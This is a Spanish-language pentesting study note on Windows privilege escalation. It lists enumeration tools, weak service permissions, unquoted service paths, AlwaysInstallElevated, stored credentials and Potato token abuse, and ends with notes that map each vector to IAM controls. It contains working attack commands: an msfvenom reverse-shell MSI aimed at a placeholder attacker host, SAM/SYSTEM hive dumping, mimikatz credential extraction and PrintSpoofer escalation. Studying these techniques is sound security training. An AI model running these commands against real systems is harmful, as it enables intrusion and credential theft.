# 04.2 Post-Explotación y Escalada de Privilegios — Windows

## Objetivo

Equivalente Windows de `01-Linux-PrivEsc.md`: pasar de un usuario estándar a SYSTEM/Administrador, documentando cada vector probado.

## 1. Enumeración automatizada

```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp (módulo PowerShell, requiere bypass de ExecutionPolicy si está restringido)
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

## 2. Vectores clásicos

### Servicios con permisos débiles

```powershell
# Servicios donde el usuario actual puede modificar el binario o su configuración
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Si un servicio corre como SYSTEM y su ruta de ejecutable es escribible/reemplazable:
sc qc nombre_servicio
```

### Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '"'
```
Si la ruta no está entre comillas y contiene espacios (`C:\Program Files\App Name\service.exe`), Windows prueba a ejecutar `C:\Program.exe` primero — si ese directorio es escribible, es escalada directa.

### AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si ambas están a 1: un .msi malicioso se instala con privilegios SYSTEM sin preguntar
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f msi -o malicioso.msi
```

### Credenciales almacenadas

```powershell
cmdkey /list
reg query HKLM\SAM
findstr /si password *.xml *.ini *.txt 2>nul
# SAM/SYSTEM hives, si hay acceso de lectura (requiere ya cierto nivel de privilegio):
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

### Tokens y privilegios asignados

```powershell
whoami /priv
```
`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` habilitados en una cuenta de servicio son, casi siempre, escalada directa vía la familia de exploits **Potato** (JuicyPotato, PrintSpoofer, RoguePotato según versión de Windows).

### Explotación de Potato (cuentas de servicio con SeImpersonatePrivilege)

```powershell
PrintSpoofer.exe -i -c cmd
```

## Matriz de vectores

| Vector | Frecuencia observada | Dificultad |
|---|---|---|
| SeImpersonatePrivilege + Potato | Alta en cuentas de servicio IIS/SQL | Baja — herramientas automatizan todo el proceso |
| Unquoted Service Path | Media | Baja |
| AlwaysInstallElevated | Baja (pero crítica cuando aparece) | Baja |
| Credenciales en ficheros de configuración / scripts de despliegue | Alta | Baja — de nuevo, higiene de secretos más que "hacking" |
| DLL Hijacking en aplicación de terceros | Media | Media |

## 3. Active Directory — movimiento lateral desde post-explotación

Si el host comprometido es miembro de un dominio, esta fase enlaza directamente con la enumeración AD de `02-Enumeracion-de-Servicios/02-SMB-y-Servicios-Infraestructura.md`:

```powershell
# Dump de hashes locales para pass-the-hash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# BloodHound para mapear rutas de escalada en el dominio
.\SharpHound.exe -c All
```

## Relación con GRC / IAM

Estos vectores son, en la práctica, la contraparte ofensiva directa de lo que se administra desde el lado defensivo en IAM/RBAC (Okta, Entra ID — ver `profile-career-roadmap`): principio de mínimo privilegio sobre cuentas de servicio, rotación de credenciales y separación de privilegios de token son los controles que neutralizan exactamente esta lista.

## Siguiente paso

Con el host comprometido, si hay segmentos de red adicionales visibles desde él, continuar en `05-Pivoting-y-Redes-Internas/01-Ligolo-ng-y-Enrutamiento.md`.
